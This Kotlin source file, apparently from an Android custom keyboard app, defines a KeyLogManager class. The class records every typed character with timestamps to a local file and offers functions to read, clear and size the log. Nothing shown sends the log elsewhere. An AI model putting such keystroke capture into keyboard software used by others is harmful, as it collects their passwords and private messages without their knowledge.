package com.nill.keyboard

import android.content.Context
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class KeyLogManager(context: Context) {

    private val file = File(context.filesDir, "nk_log.txt")
    private val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    private val buf = StringBuilder()

    fun log(ch: String) {
        try {
            if (ch == " " || ch == "\n" || ch.length > 1) {
                flush()
                if (ch.length > 1) file.appendText("[${fmt.format(Date())}] $ch\n")
            } else {
                buf.append(ch)
                if (buf.length >= 80) flush()
            }
        } catch (_: Exception) {}
    }

    private fun flush() {
        if (buf.isEmpty()) return
        try { file.appendText("[${fmt.format(Date())}] $buf\n") } catch (_: Exception) {}
        buf.clear()
    }

    fun read(): String {
        flush()
        return try {
            if (file.exists() && file.length() > 0) file.readText()
            else "No logs yet."
        } catch (_: Exception) { "Error reading log." }
    }

    fun clear() {
        buf.clear()
        try { if (file.exists()) file.delete() } catch (_: Exception) {}
    }

    fun sizeKb(): Long = if (file.exists()) file.length() / 1024 else 0
}
